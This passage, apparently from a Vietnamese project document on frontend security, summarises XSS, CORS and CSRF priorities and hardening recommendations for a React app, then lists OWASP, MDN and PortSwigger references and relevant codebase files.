│  • Fix: whitelist origins, limit methods/headers, no wildcard + credentials │
│                                                                              │
│  ──────────────────────────────────────────────────────────────────────      │
│                                                                              │
│  ƯU TIÊN BẢO MẬT CHO DỰ ÁN NÀY:                                          │
│                                                                              │
│  1. 🔴 Chống XSS (ưu tiên cao nhất)                                        │
│     → Vì token trong localStorage, XSS = mất token = mất tài khoản         │
│     → DOMPurify ✅ | CSP ❌ cần thêm | URL validation ❌ cần thêm          │
│                                                                              │
│  2. 🟡 CORS configuration                                                   │
│     → Đảm bảo backend không dùng wildcard * nếu có credentials             │
│     → Hiện tại OK vì withCredentials: false                                  │
│                                                                              │
│  3. 🟢 CSRF (ưu tiên thấp)                                                  │
│     → JWT + localStorage + Authorization header → đã immune                 │
│     → Chỉ cần quan tâm nếu chuyển sang cookie-based auth                   │
│                                                                              │
│  ──────────────────────────────────────────────────────────────────────      │
│                                                                              │
│  RECOMMENDATIONS:                                                            │
│                                                                              │
│  □ Thêm CSP header ở Nginx/CloudFront cho production                        │
│  □ DOMPurify: dùng strict config (whitelist tags) thay vì default           │
│  □ Thêm URL validation helper: chặn javascript:, data: protocols           │
│  □ Audit Breadcrumb component — dangerouslySetInnerHTML không sanitize      │
│  □ Thêm eslint-plugin-security cho CI                                       │
│  □ Cân nhắc short-lived access token (15min) + long-lived refresh token     │
│  □ Thêm Subresource Integrity (SRI) cho CDN resources                       │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## 9. Tài Liệu Tham Khảo

### Official Documentation

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN — Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [MDN — Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [MDN — Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### Libraries & Tools

- [DOMPurify — GitHub](https://github.com/cure53/DOMPurify) — HTML sanitization library used in this project
- [React Security Best Practices](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
- [Helmet.js — Express security headers](https://helmetjs.github.io/)
- [OWASP ZAP — Security scanner](https://www.zaproxy.org/)

### Deep Dive Articles

- [PortSwigger — XSS Explained](https://portswigger.net/web-security/cross-site-scripting)
- [PortSwigger — CSRF Explained](https://portswigger.net/web-security/csrf)
- [PortSwigger — CORS Explained](https://portswigger.net/web-security/cors)
- [Auth0 — Token Storage Best Practices](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)

### Trong Codebase Này

- `src/utils/http.ts` — HTTP client với JWT + Authorization header
- `src/utils/auth.ts` — Token storage (localStorage)
- `src/pages/ProductDetail/ProductDetail.tsx` — DOMPurify usage
- `src/utils/rules.ts` — Zod input validation
- `src/components/SEO/SEO.tsx` — react-helmet-async (meta tags)
- `docs/ZZ_43_CI_CD_PIPELINE_EXPLANATION.md` — CodeQL security scanning
